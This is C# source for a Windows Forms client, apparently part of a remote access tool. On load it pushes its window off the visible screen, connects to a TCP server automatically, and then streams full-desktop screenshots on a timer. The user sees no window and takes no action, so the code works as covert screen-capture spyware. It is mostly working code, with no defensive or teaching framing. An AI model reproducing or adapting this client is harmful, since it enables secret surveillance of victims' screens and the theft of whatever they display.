using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;

namespace netRAtoolClient
{
    public partial class Form1 : Form
    {
        /* NETWORK STUFF */
        private readonly TcpClient client = new TcpClient();
        private NetworkStream mainStream;
        private int portNumber = 7678;
        private string ipAddr = "127.0.0.1";
        
        private static Image TakeDesktop()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics graphic = Graphics.FromImage(screenshot);

            graphic.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            return screenshot;
        }

        private void SendDesktopImage()
        {
            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = client.GetStream();
            binFormatter.Serialize(mainStream, TakeDesktop());
        }


        private void btnConnectClick_Click(object sender, EventArgs e)
        {
            try
            {
                client.Connect(ipAddr, portNumber);
                Console.WriteLine("#Client: Connected to server");
                btnRemoteDesktop.PerformClick();
            }
            catch(Exception)
            {
                Console.WriteLine("#Client: Failed to connect");
            }
        }

        private void btnRemoteDesktop_Click(object sender, EventArgs e)
        {
            if(btnRemoteDesktop.Text.StartsWith("Share"))
            {
                timer1.Start();
                Console.WriteLine("#Client: Share desktop");
            }
            else
            {
                timer1.Stop();
                Console.WriteLine("#Client: Not share desktop");
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            SendDesktopImage();
        }

        public Form1()
        {
            InitializeComponent();
            Load += Form1_Shown;
        }

        private void Form1_Shown(Object sender, EventArgs e)
        {
            this.Location = new Point(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            btnConnectClick.PerformClick();
        }
    }
}
